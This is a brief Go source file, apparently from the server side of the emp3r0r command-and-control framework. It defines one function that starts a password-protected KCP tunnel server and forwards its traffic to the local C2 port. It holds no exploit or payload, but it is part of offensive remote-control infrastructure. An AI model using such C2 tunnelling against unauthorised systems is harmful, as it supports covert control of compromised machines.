package server

import (
	"context"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// KCPC2ListenAndServe KCP server that forwards to C2 port
func KCPC2ListenAndServe() {
	ctx, cancel := context.WithCancel(context.Background())
	tun.KCPTunServer("127.0.0.1:"+def.RuntimeConfig.CCPort,
		def.RuntimeConfig.KCPServerPort, def.RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
}
